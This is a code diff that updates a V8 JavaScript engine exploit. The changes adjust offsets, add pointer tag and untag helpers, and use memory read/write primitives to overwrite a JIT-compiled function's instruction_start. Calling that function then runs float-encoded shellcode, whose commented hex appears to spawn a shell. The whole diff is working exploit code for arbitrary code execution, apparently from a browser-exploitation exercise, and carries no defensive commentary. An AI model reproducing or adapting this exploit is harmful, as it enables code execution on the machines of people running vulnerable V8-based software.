@@ -5,7 +5,8 @@ const kTurbofanInvocationCount = 100000; // invocation count for triggering turb
 const kIntSize = 4; // size of int
 
 const kCodeOffset = 0x18; // offset of code in JSFunction
-const kShellcodeOffset = 0x75; // offset of shellcode from instruction start
+const kInstructionStartOffset = 0x10; // offset of instruction_start in Code
+const kShellcodeOffset = 0x50; // offset of shellcode from instruction start
 
 /* --------- */
 
@@ -14,6 +15,12 @@ const kShellcodeOffset = 0x75; // offset of shellcode from instruction start
 
 // compile function with turbofan
 function compileTurbofan(f, args = []) { for (let i = 0; i < kTurbofanInvocationCount; i++) { f(...args); } }
+
+// apply pointer tagging
+function tag(ptr) { return ptr | 0x1; }
+
+// remove pointer tagging
+function untag(ptr) { return ptr & 0xfffffffe; }
 
 // convert integer to hex form
 function hex(i) { return `0x${i.toString(16)}`; }
@@ -25,8 +32,6 @@ function hex(i) { return `0x${i.toString(16)}`; }
 
 function shellcode() {
     return [
-        1.1, // dummy for passing IsOffHeapTrampoline test
-
         // shellcode.py
         1.971182900732201e-246, // 0xceb909090ff3148
         1.9710255989868064e-246, // 0xceb900068732fbf
@@ -71,10 +76,13 @@ function rw(addr, value = NaN) {
 let jit_addr = addrof(shellcode);
 console.log(`[+] jit_addr == ${hex(jit_addr)}`);
 
-let code_addr = rw(jit_addr + kCodeOffset);
+let code_addr = untag(rw(jit_addr + kCodeOffset));
 console.log(`[+] code_addr == ${hex(code_addr)}`);
 
-rw(jit_addr + kCodeOffset, code_addr + kShellcodeOffset);
+let instruction_start = rw(code_addr + kInstructionStartOffset); // lower 4-byte
+console.log(`[+] instruction_start == ${hex(instruction_start)}`);
+
+rw(code_addr + kInstructionStartOffset, instruction_start + kShellcodeOffset); // overwrite instruction_start
 shellcode(); // execute shellcode
 
 /* ----------------- */
